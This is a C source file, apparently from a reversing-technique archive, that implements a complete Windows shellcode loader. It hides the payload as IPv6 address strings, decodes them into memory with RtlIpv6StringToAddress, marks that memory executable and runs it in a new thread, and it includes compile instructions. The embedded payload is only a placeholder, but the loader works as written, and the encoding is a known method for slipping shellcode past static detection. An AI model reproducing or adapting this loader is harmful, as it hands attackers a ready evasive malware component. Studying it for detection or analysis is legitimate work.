/*
    Shellcode Loader
    Archive of Reversing.ID

    writing shellcode to allocated memory

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    RtlIpv6StringToAddress
    - permission: VirtualProtect
    - execution:  CreateThread
*/

#include <windows.h>
#include <string.h>
#include <stdint.h>
#include <ip2string.h>

#pragma comment(lib,"ntdll")

/* ========= some definition ========= */
typedef struct in6_addr {
  union {
    UCHAR  Byte[16];
    USHORT Word[8];
  } u;
} IN6_ADDR, *PIN6_ADDR, *LPIN6_ADDR;


int main ()
{
    void *  runtime;
    BOOL    retval;
    HANDLE  th_shellcode;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    char *      payload []  = { "9090:ccc3::" };
    uint32_t    nitem       = 1;

    uint32_t    idx;
    in6_addr *  ip6;
    PCSTR       terminator = "";

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, nitem * 16, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // copy payload to the buffer
    ip6 = (in6_addr*) runtime;
    for (uint32_t idx = 0; idx < nitem; idx++, ip6++)
    {
        RtlIpv6StringToAddress (payload[idx], &terminator, ip6);
    }

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, nitem * 16, PAGE_EXECUTE_READ, &old_protect);

    if (retval != 0)
    {
        th_shellcode = CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
        WaitForSingleObject (th_shellcode, -1);
    }

    return 0;
}